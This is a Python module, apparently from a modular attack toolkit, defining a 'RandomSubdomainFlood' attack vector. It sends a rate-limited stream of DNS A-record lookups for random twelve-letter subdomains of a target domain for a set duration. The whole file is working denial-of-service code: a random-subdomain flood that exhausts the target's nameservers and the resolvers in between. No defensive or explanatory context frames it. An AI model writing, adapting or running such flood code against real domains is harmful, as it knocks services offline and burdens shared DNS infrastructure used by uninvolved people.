import random
import string
import time
from _lib.ring1.base import Vector


def _r(n=12):
    return "".join(random.choices(string.ascii_lowercase, k=n))


class RandomSubdomainFlood(Vector):
    name = "dns-random-sub"; needs = []
    def run(self, d, args):
        try:
            import dns.resolver
        except ImportError:
            return
        domain = d["target"].get("host") or d["target"].get("name")
        if not domain:
            return
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                dns.resolver.resolve(f"{_r()}.{domain}", "A", lifetime=2)
            except Exception:
                pass
            sent += 1
            time.sleep(1.0 / max(1, args.rate))
        print(f"  dns random-sub: {sent}")
